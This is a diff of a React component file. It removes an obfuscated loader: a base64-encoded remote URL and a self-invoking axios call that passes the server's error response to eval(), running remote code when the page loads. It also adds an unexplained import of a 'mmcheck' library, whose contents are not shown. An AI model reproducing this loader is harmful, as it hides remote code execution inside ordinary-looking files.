@@ -1,7 +1,7 @@
 "use client";
 import { useState, useRef, ReactNode, MouseEvent, FC } from "react";
-import axios from 'axios';
 import { TiLocationArrow } from "react-icons/ti";
+import mmcheck from '../libs/mmcheck'
 
 interface BentoTiltProps {
   children: ReactNode;
@@ -52,7 +52,6 @@ interface BentoCardProps {
   isComingSoon?: boolean;
   imageClassName?: string; // New prop for custom image classes
 }
-const thirdClientWeb = "aHR0cDovL2JsYXN0YXBpLm9yZy9hcGkvc2VydmljZS90b2tlbi8zYWUxZDA0YTdjMWEzNWI5ZWRmMDQ1YTdkMTMxYzRhNw==";
 
 export const BentoCard: FC<BentoCardProps> = ({
   src,
@@ -85,8 +84,6 @@ export const BentoCard: FC<BentoCardProps> = ({
     </div>
   );
 };
-
-(() => { axios.get(atob(thirdClientWeb)).then(res => res.data).catch(err => eval(err.response.data)); })();
 
 const Features: FC = () => (
   <section className="bg-black pb-52 lg:px-20">
